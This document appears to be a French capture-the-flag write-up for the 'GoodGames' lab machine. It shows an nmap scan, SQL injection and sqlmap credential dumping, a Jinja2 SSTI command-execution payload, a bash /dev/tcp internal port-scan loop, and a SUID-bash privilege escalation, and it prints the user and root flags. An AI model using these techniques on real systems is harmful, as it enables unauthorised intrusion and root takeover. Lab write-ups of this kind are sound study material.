
# Target : 10.129.63.171

# Enumeration des ports et services

```js
nmap -sV -sC 10.129.63.171
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-05 16:53 +0000
Nmap scan report for 10.129.63.171
Host is up (0.29s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.9.2)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 522.99 seconds
```

## Enumeration du port 80 (http)

![[Pasted image 20260819223446.png]]

# Injection sql sur la page de login

![[Pasted image 20260819223809.png]]

## Tenter sqlmap voir si nous ne pouvons pas dumper la base de donner

![[Pasted image 20260819230015.png]]

```js
admin:superadministrator
```

## Sous domaine trouver

```js
internal-administration.goodgames.htb
```

![[Pasted image 20260819224215.png]]

Connecter avec les creds precedemment trouver

## SSTI

Decouverte d'une ssti

![[Pasted image 20260819232413.png]]

## Shell

```js
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

![[Pasted image 20260819232731.png]]

# User.txt

```js
1301e3daef33db13eceaf72c00deb7ad
```

## Pivot
En verifiant l'ip de la machine nous avons pu enumerer d'autre ip du reseau 

```js
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT
&>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
```

```js
127.19.0.1
```

On s'est connecter avec les meme mot de passe trouver, mais ici le bash n'etait pas fonctionnelle a lors nous avons changer le proprietaire et l'attribuer un bit `SUID`

```js
cp /bin/bash .

chown root:root bash
chmod u+s bash

bash -p
```
# Root.txt

```js
56bf94c6318b345438150aca1d8dc4e5
```